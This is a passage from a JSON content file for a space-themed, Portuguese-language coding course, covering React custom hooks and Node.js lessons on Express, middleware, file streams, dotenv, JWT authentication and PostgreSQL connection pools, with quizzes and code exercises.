visual:\n\n```tsx\nexport function PainelPesquisa() {\n  const [busca, setBusca] = useState('');\n  const buscaDebounced = useDebounce(busca, 400);\n\n  useEffect(() => {\n    if (buscaDebounced) {\n      console.log('Pesquisando na base de dados:', buscaDebounced);\n    }\n  }, [buscaDebounced]);\n\n  return (\n    <input\n      type=\"text\"\n      value={busca}\n      onChange={(e) => setBusca(e.target.value)}\n      placeholder=\"Digite para buscar...\"\n    />\n  );\n}\n```\n\n- Dois componentes que usam o mesmo Custom Hook **não compartilham o mesmo estado**; cada invocação cria um estado totalmente isolado e independente!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a convenção de nomenclatura `use...`. Se você nomear sua função sem o prefixo `use`, os linters do React não conseguirão verificar se você está respeitando as Regras dos Hooks (não chamar dentro de loops ou condicionais).\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Retorne objetos `{ dados, carregando, erro }` em hooks assíncronos ou tuplas `[valor, setValor]` para utilitários tipo state.\n- Mantenha cada Custom Hook focado em uma única responsabilidade clara.\n\n> **🛡️ Regra de Ouro:**\n> Se você repetiu uma combinação de `useState` + `useEffect` em dois componentes diferentes, é hora de transformá-la em um Custom Hook!",
        "codeExample": "export function useAlternar(inicial: boolean = false): [boolean, () => void] {\n  const [ativo, setAtivo] = useState(inicial);\n  const alternar = () => setAtivo(prev => !prev);\n  return [ativo, alternar];\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "O que acontece com o estado quando dois componentes diferentes utilizam o mesmo Custom Hook?",
            "options": [
              "Eles passam a compartilhar o mesmo valor em sincronia instantânea.",
              "Cada componente recebe sua própria instância de estado totalmente independente e isolada.",
              "O segundo componente sobrescreve o primeiro e o apaga da tela.",
              "Ocorre um erro de compilação por colisão de nomes."
            ],
            "correctIndex": 1,
            "explanation": "Custom Hooks reutilizam a lógica com estado, mas não o estado em si: cada chamada ao hook tem variáveis de estado isoladas."
          },
          {
            "type": "code",
            "instruction": "Escreva a assinatura e retorno de um custom hook chamado \"useContador\" que inicie com useState(0) e retorne [contador, incrementar].",
            "initialCode": "import { useState } from \"react\";\n// Crie o hook useContador aqui\n",
            "expectedKeywords": [
              "function useContador()",
              "useState(0)",
              "return [contador, incrementar];"
            ],
            "hint": "Crie function useContador() { const [contador, setContador] = useState(0); const incrementar = () => setContador(c => c + 1); return [contador, incrementar]; }",
            "solution": "function useContador() {\n  const [contador, setContador] = useState(0);\n  const incrementar = () => setContador(c => c + 1);\n  return [contador, incrementar];\n}"
          }
        ]
      }
    ]
  },
  {
    "id": "nodejs",
    "slug": "nodejs",
    "name": "Node.js",
    "planetName": "Backend Colony",
    "description": "Execute JavaScript no servidor e construa APIs escaláveis e velozes.",
    "icon": "🟢",
    "color": "#339933",
    "language": "javascript",
    "level": "Intermediário",
    "totalXp": 525,
    "lessons": [
      {
        "id": "node-1",
        "title": "1. O Motor do Servidor & Arquitetura Assíncrona",
        "description": "Entenda como o runtime Node.js executa JavaScript de alta performance fora do browser.",
        "duration": 15,
        "xpReward": 60,
        "language": "javascript",
        "content": "# 🟢 O Motor do Servidor: Node.js\n\nBem-vindo à **Backend Colony**, a base de infraestrutura que sustenta todos os sistemas da frota!\n\nDurante quase 15 anos, o JavaScript esteve confinado dentro das janelas dos navegadores. Em 2009, Ryan Dahl pegou a engine **V8** do Google Chrome e a uniu a um sistema de entrada/saída assíncrono para criar o **Node.js**: o JavaScript agora domina os servidores!\n\n---\n\n### ⚡ O Segredo da Performance: Event Loop Não Bloqueante\n\nEm servidores tradicionais (como PHP clássico ou Apache), cada usuário conectado ocupa uma nova thread pesada do sistema operacional. Se 1.000 usuários fizerem consultas lentas, o servidor esgota a memória.\n\nO Node.js adota uma arquitetura diferente:\n- **Single-Threaded:** Opera com uma thread principal para execução lógica.\n- **Não-Bloqueante (Non-blocking I/O):** Quando você pede um arquivo do disco ou consulta o banco de dados, o Node entrega o trabalho para o sistema operacional em segundo plano e continua atendendo outros usuários imediatamente!\n\n---\n\n### 📦 Modularidade: CommonJS vs ESM\n\nNo Node moderno, usamos o padrão oficial **ES Modules** (`import` / `export`):\n\n```javascript\nimport fs from 'fs/promises';\n\nasync function lerRegistro() {\n  const log = await fs.readFile('telemetria.log', 'utf-8');\n  console.log(log);\n}\n```\n\n> **💡 Dica Pro:**\n> Adicione `\"type\": \"module\"` no seu arquivo `package.json` para usar nativamente a sintaxe `import/export` sem precisar de ferramentas de build complexas.\n\n> **⚠️ Armadilha Comum:**\n> Executar operações síncronas pesadas (como `fs.readFileSync`) em rotas de produção congela a thread principal e impede o servidor de responder a qualquer outro usuário até o fim da leitura!",
        "codeExample": "// Servidor HTTP Nativo do Node.js\nimport http from 'http';\n\nconst servidor = http.createServer((requisicao, resposta) => {\n  resposta.writeHead(200, { 'Content-Type': 'application/json' });\n  resposta.end(JSON.stringify({ status: 'BASE_OPERACIONAL', cadetesOnline: 42 }));\n});\n\nservidor.listen(3000, () => {\n  console.log('Servidor da Backend Colony escutando na porta 3000!');\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a principal característica da arquitetura do Node.js que permite atender milhares de requisições concorrentes de forma ultrarrápida?",
            "options": [
              "Criar uma nova thread física na CPU para cada requisição recebida.",
              "Modelo de E/S assíncrono e não-bloqueante baseado em um Event Loop de thread única.",
              "Compilar o código diretamente para linguagem Assembly proprietária da IBM.",
              "Executar apenas em computadores quânticos de alta voltagem."
            ],
            "correctIndex": 1,
            "explanation": "O modelo de I/O não-bloqueante delega operações lentas (leitura de arquivos, banco de dados, rede) em background, mantendo o Event Loop sempre livre para receber novas conexões."
          },
          {
            "type": "fillblank",
            "title": "Inicializando o Servidor HTTP",
            "instruction": "Preencha a porta onde o servidor da colônia escutará as conexões recebidas.",
            "codeSnippet": "const PORTA = 3000;\nservidor.{{metodo_escuta}}(PORTA, () => {\n  console.log(\"Servidor ativo na porta\", PORTA);\n});",
            "blanks": [
              {
                "id": "metodo_escuta",
                "placeholder": "método para escutar",
                "expectedValues": [
                  "listen"
                ],
                "hint": "Palavra em inglês que significa \"escutar\" ou \"ouvir\"."
              }
            ],
            "explanation": "Perfeito! O método listen(porta) coloca o servidor Node.js em modo de escuta contínua na porta de rede informada."
          }
        ]
      },
      {
        "id": "node-2",
        "title": "2. Criando APIs REST com Express",
        "description": "Construa rotas, receba requisições JSON e responda com códigos de status HTTP apropriados.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🚀 APIs REST com Express\n\nEmbora o módulo HTTP nativo do Node funcione, no dia a dia da indústria usamos **frameworks web** para criar rotas limpas, autenticação e middlewares. O **Express** é o líder absoluto desse ecossistema.\n\n---\n\n### 🛣️ O que é uma API REST?\n\nUma **API REST** permite que diferentes sistemas (aplicativos móveis, páginas web, relógios inteligentes) conversem através do protocolo HTTP padrão da web:\n\n- `GET /api/missoes`: Buscar informações.\n- `POST /api/missoes`: Criar um novo recurso.\n- `PUT /api/missoes/:id`: Atualizar um recurso existente.\n- `DELETE /api/missoes/:id`: Remover um recurso.\n\n---\n\n### 📦 Criando um Servidor Express em 10 Linhas\n\n```javascript\nimport express from 'express';\n\nconst app = express();\napp.use(express.json()); // Permite ler o corpo das requisições em formato JSON!\n\napp.get('/api/status', (req, res) => {\n  res.status(200).json({ status: 'Online', sistema: 'Nexus Core' });\n});\n\napp.post('/api/cadetes', (req, res) => {\n  const { nome } = req.body;\n  res.status(201).json({ mensagem: `Cadete ${nome} registrado!` });\n});\n\napp.listen(3000);\n```\n\n---\n\n### 🚦 Códigos de Status HTTP Que Todo Desenvolvedor Deve Saber\n\n- **200 OK:** Sucesso padrão para leitura ou atualização.\n- **201 Created:** Sucesso ao criar um novo registro no banco.\n- **400 Bad Request:** O cliente enviou dados inválidos ou incompletos.\n- **404 Not Found:** O recurso solicitado não existe.\n- **500 Internal Server Error:** Falha inesperada no servidor.\n\n> **💡 Dica Pro:**\n> Sempre responda com o status code correto! Enviar `200 OK` quando houve erro ou `200` em vez de `201` ao criar um recurso confunde o frontend e dificulta a manutenção da API.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer a linha `app.use(express.json())` faz com que qualquer rota `POST` receba `req.body` como `undefined`!",
        "codeExample": "import express from 'express';\n\nconst app = express();\napp.use(express.json());\n\n// Rota de listagem de módulos\napp.get('/modulos', (req, res) => {\n  res.status(200).json([\n    { id: 1, nome: \"Escudo Térmico\" },\n    { id: 2, nome: \"Sensor Quântico\" }\n  ]);\n});\n\napp.listen(8080);",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual código de status HTTP (Status Code) é o padrão RESTful para indicar que uma requisição POST criou com sucesso um novo recurso no sistema?",
            "options": [
              "200 OK",
              "201 Created",
              "302 Found",
              "204 No Content"
            ],
            "correctIndex": 1,
            "explanation": "O status HTTP 201 (Created) é a resposta semântica ideal para informar que a criação do recurso solicitada via POST foi realizada com sucesso no banco de dados."
          },
          {
            "type": "code",
            "instruction": "Crie uma rota GET em app para o caminho \"/ping\" que retorne o status 200 com o JSON { mensagem: \"pong\" }.",
            "initialCode": "// Considere que a constante \"app\" do express já existe\n// Adicione a rota abaixo\n",
            "expectedKeywords": [
              "app.get",
              "/ping",
              "res.status(200)",
              "mensagem: \"pong\"",
              "json("
            ],
            "hint": "Faça app.get(\"/ping\", (req, res) => { res.status(200).json({ mensagem: \"pong\" }); });.",
            "solution": "app.get(\"/ping\", (req, res) => {\n  res.status(200).json({ mensagem: \"pong\" });\n});"
          },
          {
            "type": "bughunt",
            "title": "O Enigma do Body Indefinido",
            "scenario": "O desenvolvedor configurou a rota POST de cadastro de cadetes, mas req.body sempre chega como undefined porque faltou o middleware de leitura de JSON do Express.",
            "buggyCode": "import express from 'express';\nconst app = express();\n\n// Faltou o middleware aqui!\n\napp.post('/cadetes', (req, res) => {\n  const { nome } = req.body;\n  res.status(201).json({ cadastrado: nome });\n});",
            "expectedKeywords": [
              "app.use(express.json());"
            ],
            "forbiddenKeywords": [
              "// Faltou o middleware aqui!"
            ],
            "hint": "Adicione app.use(express.json()); logo abaixo da inicialização de app para habilitar o parsing de JSON.",
            "solutionExplanation": "Perfeito! app.use(express.json()) intercepta o corpo das requisições HTTP, converte a string JSON em objeto JavaScript e a disponibiliza em req.body."
          }
        ]
      },
      {
        "id": "node-3",
        "title": "3. Middlewares e Tratamento Centralizado de Erros",
        "description": "Construa interceptores com (req, res, next) e middleware global para capturar exceções sem derrubar o servidor.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🛡️ Middlewares e Tratamento Centralizado de Erros\n\nBem-vindo ao setor de proteção de Backend Colony! No Node.js com Express, requisições HTTP trafegam por uma esteira de processamento formada por **Middlewares**.\n\n> **💡 O que é um Middleware?**\n> Um middleware é uma função que tem acesso ao objeto de requisição (`req`), ao objeto de resposta (`res`) e à próxima função da esteira (`next`). Ele pode registrar logs, autenticar usuários, validar dados ou abortar a chamada.\n\n---\n\n### ⚙️ A Anatomia de um Middleware\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// Middleware de Log de Auditoria\nfunction logRequisicao(req, res, next) {\n  const agora = new Date().toISOString();\n  console.log(`[${agora}] ${req.method} em ${req.url}`);\n  next(); // IMPORTANTE: passa o bastão para o próximo middleware!\n}\n\napp.use(logRequisicao);\n```\n\n- Se você esquecer de chamar `next()` (ou não enviar uma resposta com `res.send()`), a requisição ficará congelada para sempre e o cliente sofrerá timeout!\n\n---\n\n### 🚨 Middleware de Erro Centralizado (4 Parâmetros)\n\nO Express possui uma assinatura mágica de 4 parâmetros reservada para captura de erros:\n\n```javascript\n// Middleware de tratamento global de erros (deve ser o ÚLTIMO declarado no app!)\napp.use((err, req, res, next) => {\n  console.error('Falha crítica capturada:', err.stack);\n  const status = err.statusCode || 500;\n  res.status(status).json({\n    sucesso: false,\n    mensagem: err.message || 'Erro interno no servidor Nexus'\n  });\n});\n```\n\n> **⚠️ Armadilha Comum:**\n> Deixar de declarar o quarto parâmetro `next` no middleware de erro. O Express usa a quantidade de argumentos da função (`fn.length === 4`) para identificar que se trata de um manipulador de erro!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Utilize classes de erro customizadas herdando de `Error` (ex: `class AppError extends Error`) com propriedades como `statusCode`.\n- Nunca exponha rastros de pilha completos (`stack trace`) em ambiente de produção para clientes externos.\n\n> **🛡️ Regra de Ouro:**\n> Uma API profissional nunca deixa exceções não tratadas derrubarem o processo do Node.js (*uncaughtException*).",
        "codeExample": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\n// Validador de token simples\napp.use((req, res, next) => {\n  if (!req.headers['x-nexus-auth']) {\n    return res.status(401).json({ erro: 'Token ausente' });\n  }\n  next();\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Como o Express identifica que uma função de middleware é um manipulador centralizado de erros?",
            "options": [
              "Pela presença da propriedade isErrorHandler: true.",
              "Pela assinatura conter exatamente 4 parâmetros: (err, req, res, next).",
              "Pela função ter o nome obrigatoriamente chamado \"errorHandler\".",
              "Pelo uso do prefixo throw no início da função."
            ],
            "correctIndex": 1,
            "explanation": "O Express inspeciona a quantidade de argumentos da função: ao detectar 4 parâmetros (err, req, res, next), ele a registra como middleware de erro."
          },
          {
            "type": "code",
            "instruction": "Crie uma função middleware chamada \"verificarAdmin\" que receba (req, res, next). Se \"req.user.role === 'admin'\", chame next(); caso contrário, retorne res.status(403).json({ erro: 'Acesso negado' }).",
            "initialCode": "// Crie a função verificarAdmin aqui\n",
            "expectedKeywords": [
              "function verificarAdmin(req, res, next)",
              "req.user.role === 'admin'",
              "next()",
              "res.status(403)"
            ],
            "hint": "Use if (req.user && req.user.role === 'admin') { next(); } else { return res.status(403).json({ erro: 'Acesso negado' }); }",
            "solution": "function verificarAdmin(req, res, next) {\n  if (req.user && req.user.role === 'admin') {\n    return next();\n  }\n  return res.status(403).json({ erro: 'Acesso negado' });\n}"
          }
        ]
      },
      {
        "id": "node-4",
        "title": "4. Manipulação de Arquivos e Streams com fs",
        "description": "Leia, escreva e transmita dados espaciais com o módulo nativo fs/promises e Streams de alta velocidade.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 📁 Manipulação de Arquivos e Streams com fs\n\nOperando o disco na Backend Colony! O Node.js possui um dos ecossistemas de I/O mais rápidos do planeta através do módulo nativo **`fs`** (*File System*).\n\n> **💡 Operações Bloqueantes vs Não-Bloqueantes**\n> Nunca utilize funções sincronas como `fs.readFileSync` no servidor principal: elas congelam a thread do Node.js inteira, impedindo outros usuários de acessarem o sistema. Use sempre a API baseada em Promises: `fs/promises`.\n\n---\n\n### 📝 Leitura e Escrita Moderna com `fs/promises`\n\n```javascript\nconst fs = require('fs/promises');\nconst path = require('path');\n\nasync function gerenciarDiarioDeBordo() {\n  const caminho = path.join(__dirname, 'telemetria.log');\n\n  try {\n    // Escrever ou sobrescrever\n    await fs.writeFile(caminho, 'Registro 01: Reator estável\n', 'utf-8');\n\n    // Acrescentar no fim do arquivo (append)\n    await fs.appendFile(caminho, 'Registro 02: Velocidade de dobra alcançada\n');\n\n    // Ler conteúdo completo\n    const conteudo = await fs.readFile(caminho, 'utf-8');\n    console.log('Conteúdo salvo:', conteudo);\n  } catch (erro) {\n    console.error('Falha de acesso ao disco:', erro.message);\n  }\n}\n```\n\n---\n\n### 🌊 Streams: Processando Arquivos Gigantescos sem Estourar a RAM\n\nSe você precisa ler um arquivo de 2 GB, carregar tudo com `readFile` vai consumir 2 GB de memória RAM e derrubar o processo. Para isso usamos **Streams** (fluxos contínuos em pedaços / *chunks*):\n\n```javascript\nconst fs = require('fs');\n\nconst leitor = fs.createReadStream('arquivo-gigante.csv');\nconst escritor = fs.createWriteStream('copia-destino.csv');\n\n// O método pipe conecta a torneira de entrada diretamente na saída!\nleitor.pipe(escritor);\n\nescritor.on('finish', () => {\n  console.log('Arquivo transmitido com baixíssimo uso de memória RAM!');\n});\n```\n\n> **⚠️ Armadilha Comum:**\n> Concatenar caminhos de arquivo manualmente usando barras (`diretorio + '/' + arquivo`). No Windows usam-se barras invertidas (`\\`) e no Linux barras normais (`/`). Sempre use `path.join()` para compatibilidade multiplataforma!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Especifique sempre a codificação `'utf-8'` ao ler arquivos de texto para receber uma string e não um buffer binário bruto.\n- Utilize `fs.stat` para verificar se o arquivo existe ou o tamanho dele antes de operações pesadas.\n\n> **🛡️ Regra de Ouro:**\n> Para transferência de arquivos e downloads em servidores HTTP, utilize Streams e canalize com `stream.pipe(res)`.",
        "codeExample": "const fs = require('fs/promises');\nconst path = require('path');\n\nasync function salvarLogMissao(dados) {\n  const arquivo = path.join(__dirname, 'missoes.json');\n  await fs.writeFile(arquivo, JSON.stringify(dados, null, 2), 'utf-8');\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que o uso de Streams (createReadStream) é recomendado ao lidar com grandes arquivos no Node.js?",
            "options": [
              "Streams aceleram o processador em 400% automaticamente.",
              "Streams quebram o arquivo em pequenos pedaços (chunks), processando sob demanda sem carregar o arquivo inteiro na memória RAM.",
              "Streams convertem qualquer arquivo de imagem para texto legível.",
              "Streams impedem que o arquivo seja apagado por hackers."
            ],
            "correctIndex": 1,
            "explanation": "Streams permitem manipular grandes fluxos de dados em pequenos pedaços incrementais com consumo de memória RAM constante e eficiente."
          },
          {
            "type": "fillblank",
            "title": "Importando e Lendo Arquivo Assíncrono com fs/promises",
            "instruction": "Preencha a importação correta e o método de leitura assíncrona com Promises.",
            "codeSnippet": "const fs = require(\"fs/___\");\n\nasync function ler() {\n  const texto = await fs.___(caminho, \"utf-8\");\n}",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "submódulo de promises",
                "expectedValues": [
                  "promises"
                ],
                "hint": "O submódulo oficial do fs que fornece suporte nativo a async/await."
              },
              {
                "id": "blank-2",
                "placeholder": "método de leitura",
                "expectedValues": [
                  "readFile"
                ],
                "hint": "Método para ler o conteúdo de um arquivo."
              }
            ],
            "explanation": "Com require(\"fs/promises\") e await fs.readFile(caminho, \"utf-8\"), o Node lê o arquivo de forma assíncrona e devolve o texto."
          }
        ]
      },
      {
        "id": "node-5",
        "title": "5. Variáveis de Ambiente e Configuração Segura",
        "description": "Isole credenciais e URLs de banco de dados com dotenv, process.env e regras de segurança.",
        "duration": 15,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🔒 Variáveis de Ambiente e Configuração Segura\n\nSegurança da base operacional na Backend Colony! Chaves secretas, tokens de API e senhas de banco de dados **jamais** devem ser gravadas diretamente no código-fonte (*hardcoded*).\n\n> **💡 O que são Variáveis de Ambiente?**\n> São variáveis globais configuradas no sistema operacional do servidor. Elas permitem que o mesmo código execute no ambiente de Desenvolvimento, Testes e Produção alternando configurações automaticamente.\n\n---\n\n### 📦 O Pacote `dotenv` e o Arquivo `.env`\n\nNa raiz do projeto, criamos um arquivo chamado `.env`:\n\n```env\nPORTA=4000\nDATABASE_URL=postgresql://cadete:segredo@banco.nexus.io:5432/producao\nJWT_SECRET=super_chave_criptografica_inviolavel_2026\nNODE_ENV=production\n```\n\nNo seu código Node.js, carregamos o arquivo no início da aplicação:\n\n```javascript\nrequire('dotenv').config();\n\nconst porta = process.env.PORTA || 3000;\nconst dbUrl = process.env.DATABASE_URL;\n\nconsole.log(`Servidor configurado para rodar na porta: ${porta}`);\n```\n\n---\n\n### 🛡️ O Arquivo Sagrado: `.gitignore`\n\nO arquivo `.env` contém segredos que **nunca** devem ir para o GitHub!\n\n```gitignore\n# .gitignore\nnode_modules/\n.env\n.env.local\ndist/\n```\n\nPara a equipe saber quais variáveis são necessárias, crie um arquivo modelo de exemplo: `.env.example` com valores fictícios.\n\n> **⚠️ Armadilha Comum:**\n> Fazer commit acidental do `.env` no Git. Mesmo que você delete o arquivo no commit seguinte, ele continua registrado no histórico do Git para sempre! Se isso acontecer, você deve revogar todas as senhas imediatamente.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Valide a existência de variáveis críticas na inicialização do servidor: se faltar a `DATABASE_URL`, pare o processo na hora com uma mensagem clara.\n- Utilize bibliotecas de validação de schemas de ambiente como `zod` ou `envalid`.\n\n> **🛡️ Regra de Ouro:**\n> O código do repositório deve ser público ou seguro o suficiente para que vazar o código não comprometa suas senhas e bancos.",
        "codeExample": "require('dotenv').config();\n\nfunction validarAmbiente() {\n  const obrigatorias = ['DATABASE_URL', 'JWT_SECRET'];\n  for (const chave of obrigatorias) {\n    if (!process.env[chave]) {\n      throw new Error(`Variável obrigatória ausente no ambiente: ${chave}`);\n    }\n  }\n}\n\nvalidarAmbiente();",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual objeto global do Node.js é utilizado para acessar variáveis de ambiente configuradas no sistema?",
            "options": [
              "window.env",
              "process.env",
              "global.config",
              "system.variables"
            ],
            "correctIndex": 1,
            "explanation": "O objeto process.env contém todas as variáveis de ambiente disponibilizadas pelo sistema operacional ou pelo dotenv."
          },
          {
            "type": "code",
            "instruction": "Crie uma constante chamada \"porta\" que receba o valor de \"process.env.PORT\" ou use o número 3000 como fallback padrão.",
            "initialCode": "// Crie a constante porta aqui\n",
            "expectedKeywords": [
              "const porta =",
              "process.env.PORT",
              "||",
              "3000"
            ],
            "hint": "Use: const porta = process.env.PORT || 3000;",
            "solution": "const porta = process.env.PORT || 3000;"
          }
        ]
      },
      {
        "id": "node-6",
        "title": "6. Autenticação Segura com Tokens JWT",
        "description": "Proteja rotas e emita credenciais de acesso temporárias com JSON Web Tokens (jsonwebtoken).",
        "duration": 17,
        "xpReward": 70,
        "language": "javascript",
        "content": "# 🔑 Autenticação Segura com Tokens JWT\n\nPortões de alta segurança na Backend Colony! Em arquiteturas de microsserviços e APIs REST modernas, o servidor é **stateless** (sem estado de sessão salvo em memória). Para validar a identidade do usuário, usamos **JWT** (*JSON Web Token*).\n\n> **💡 O que é um JWT?**\n> Um JWT é um pacote criptograficamente assinado pelo servidor. Ele contém três partes separadas por pontos: `Header.Payload.Signature`. O cliente guarda o token e o envia a cada requisição no cabeçalho `Authorization: Bearer <token>`.\n\n---\n\n### ✍️ Emitindo um Token no Login\n\n```javascript\nconst jwt = require('jsonwebtoken');\n\nfunction gerarTokenDeAcesso(usuario) {\n  const payload = {\n    id: usuario.id,\n    patente: usuario.patente\n  };\n\n  const segredo = process.env.JWT_SECRET;\n  \n  // Gera token assinado com expiração de 2 horas\n  return jwt.sign(payload, segredo, { expiresIn: '2h' });\n}\n```\n\n---\n\n### 🛡️ Validando o Token no Middleware de Rota\n\n```javascript\nfunction autenticarToken(req, res, next) {\n  const authHeader = req.headers['authorization'];\n  // Formato recebido: \"Bearer <token>\"\n  const token = authHeader && authHeader.split(' ')[1];\n\n  if (!token) {\n    return res.status(401).json({ erro: 'Acesso negado: token ausente' });\n  }\n\n  jwt.verify(token, process.env.JWT_SECRET, (erro, usuarioDecodificado) => {\n    if (erro) {\n      return res.status(403).json({ erro: 'Token inválido ou expirado' });\n    }\n\n    req.usuario = usuarioDecodificado; // Injeta o usuário na requisição!\n    next();\n  });\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Armazenar senhas ou dados ultra confidenciais dentro do payload do JWT! O payload **não é criptografado**, apenas codificado em Base64. Qualquer pessoa consegue ler o conteúdo decodificando a string!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Defina prazos de expiração curtos para Access Tokens (ex: 15 minutos) e use Refresh Tokens para renovações silenciosas.\n- Assine sempre os tokens com algoritmos fortes (como HMAC SHA256 ou RSA256).\n\n> **🛡️ Regra de Ouro:**\n> A assinatura do JWT garante que ninguém alterou o conteúdo do payload no caminho; se um único bit for forjado, o servidor rejeitará a assinatura na hora.",
        "codeExample": "// Protegendo rota com o middleware\napp.get('/api/frota/coordenadas', autenticarToken, (req, res) => {\n  res.json({\n    mensagem: `Bem-vindo comandante ${req.usuario.id}`,\n    coordenadas: 'Setor Alfa-9'\n  });\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Em qual cabeçalho HTTP e com qual prefixo padrão os tokens JWT são enviados pelo cliente nas requisições da API?",
            "options": [
              "Content-Type: application/jwt",
              "Authorization: Bearer <token>",
              "X-Auth-Token: Token <token>",
              "User-Agent: NexusClient <token>"
            ],
            "correctIndex": 1,
            "explanation": "O padrão internacional RFC 6750 define o envio de credenciais através do header \"Authorization: Bearer <token>\"."
          },
          {
            "type": "code",
            "instruction": "Escreva a linha de código usando \"jwt.sign\" que gere um token assinado contendo \"{ id: 42 }\" com a chave \"chaveSecreta\" e expiração em \"1h\".",
            "initialCode": "const jwt = require(\"jsonwebtoken\");\n// Gere a constante token aqui\n",
            "expectedKeywords": [
              "const token = jwt.sign(",
              "{ id: 42 }",
              "'chaveSecreta'",
              "{ expiresIn: '1h' }"
            ],
            "hint": "Use: const token = jwt.sign({ id: 42 }, 'chaveSecreta', { expiresIn: '1h' });",
            "solution": "const jwt = require('jsonwebtoken');\nconst token = jwt.sign({ id: 42 }, 'chaveSecreta', { expiresIn: '1h' });"
          }
        ]
      },
      {
        "id": "node-7",
        "title": "7. Conexão com Bancos de Dados e Consultas Assíncronas",
        "description": "Conecte sua API a bancos relacionais e NoSQL usando pools de conexão estáveis e consultas preparadas.",
        "duration": 16,
        "xpReward": 65,
        "language": "javascript",
        "content": "# 🗄️ Conexão com Bancos de Dados e Consultas Assíncronas\n\nSincronizando o cofre de dados em Backend Colony! Uma API REST de verdade precisa armazenar dados permanentemente em um Sistema Gerenciador de Banco de Dados (como PostgreSQL, MySQL ou MongoDB).\n\n> **💡 O que é um Connection Pool (Pool de Conexões)?**\n> Abrir uma nova conexão TCP com o banco a cada requisição HTTP é um processo lento e pesado. Um **Pool de Conexões** mantém uma quantidade controlada de conexões abertas e prontas para reutilização instantânea.\n\n---\n\n### 🐘 Conectando ao PostgreSQL com o driver nativo `pg`\n\n```javascript\nconst { Pool } = require('pg');\n\nconst pool = new Pool({\n  connectionString: process.env.DATABASE_URL,\n  max: 10, // Máximo de 10 conexões simultâneas no pool\n  idleTimeoutMillis: 30000\n});\n\nasync function buscarNavePorId(id) {\n  // Consultas parametrizadas com $1 protegem 100% contra SQL Injection!\n  const query = 'SELECT id, modelo, status FROM naves WHERE id = $1';\n  const valores = [id];\n\n  const resultado = await pool.query(query, valores);\n  return resultado.rows[0];\n}\n```\n\n---\n\n### 🔄 Transações: Tudo ou Nada\n\nQuando uma operação envolve múltiplos passos críticos (ex: debitar créditos de uma conta e creditar em outra):\n\n```javascript\nconst client = await pool.connect();\ntry {\n  await client.query('BEGIN'); // Inicia a transação\n  \n  await client.query('UPDATE contas SET saldo = saldo - 100 WHERE id = $1', [remetenteId]);\n  await client.query('UPDATE contas SET saldo = saldo + 100 WHERE id = $1', [destinatarioId]);\n\n  await client.query('COMMIT'); // Confirma as duas alterações juntas!\n} catch (erro) {\n  await client.query('ROLLBACK'); // Desfaz tudo se qualquer linha falhar!\n  throw erro;\n} finally {\n  client.release(); // Libera o cliente de volta para o pool!\n}\n```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o `client.release()` no bloco `finally`. Sem isso, as conexões ficam presas para sempre e em poucos minutos o pool se esgota (*pool exhaustion*), travando a API inteira!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use sempre consultas parametrizadas (`$1, $2` no Postgres ou `?, ?` no MySQL). Nunca concatene variáveis diretamente no texto da query.\n- Em projetos corporativos, considere o uso de ORMs modernos como Prisma ou Drizzle para tipagem estática integrada.\n\n> **🛡️ Regra de Ouro:**\n> O pool de conexões deve ser instanciado uma única vez como um Singleton e compartilhado por todos os módulos da aplicação.",
        "codeExample": "// Endpoint conectado ao banco de dados\napp.get('/api/naves', async (req, res, next) => {\n  try {\n    const { rows } = await pool.query('SELECT * FROM naves ORDER BY id ASC');\n    res.json(rows);\n  } catch (err) {\n    next(err); // Encaminha o erro para o middleware centralizado!\n  }\n});",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a finalidade principal do comando ROLLBACK dentro de um bloco de transação em um banco de dados relacional?",
            "options": [
              "Fazer backup diário das tabelas em formato ZIP.",
              "Desfazer com segurança todas as alterações executadas desde o início da transação caso ocorra uma falha.",
              "Reiniciar o serviço do servidor de banco de dados.",
              "Impedir novas conexões na porta TCP."
            ],
            "correctIndex": 1,
            "explanation": "O comando ROLLBACK reverte todas as instruções SQL executadas dentro da transação atual, garantindo a atomicidade (princípio ACID)."
          },
          {
            "type": "bughunt",
            "title": "Correção de Vazamento de Conexão no Pool",
            "scenario": "Um cadete adquiriu um cliente do pool com pool.connect(), mas não incluiu o bloco finally com client.release(), gerando travamento do servidor após algumas requisições. Corrija o código.",
            "buggyCode": "async function transferir() {\n  const client = await pool.connect();\n  try {\n    await client.query(\"BEGIN\");\n    await client.query(\"COMMIT\");\n  } catch (e) {\n    await client.query(\"ROLLBACK\");\n  }\n}",
            "expectedKeywords": [
              "finally {",
              "client.release();",
              "}"
            ],
            "hint": "Adicione um bloco finally ao final do try/catch chamando client.release().",
            "solutionExplanation": "O bloco finally garante a liberação do cliente de volta para o pool de conexões independentemente de ter ocorrido sucesso ou erro."
          }
        ]
      },
      {
        "id": "node-8",
        "title": "8. Testes Automatizados de Rotas com Supertest e Jest",
        "description": "Garanta a estabilidade de produção escrevendo suítes de testes de integração automatizadas com Jest e Supertest.",
        "duration": 17,
        "xpReward": 70,
        "language": "javascript",
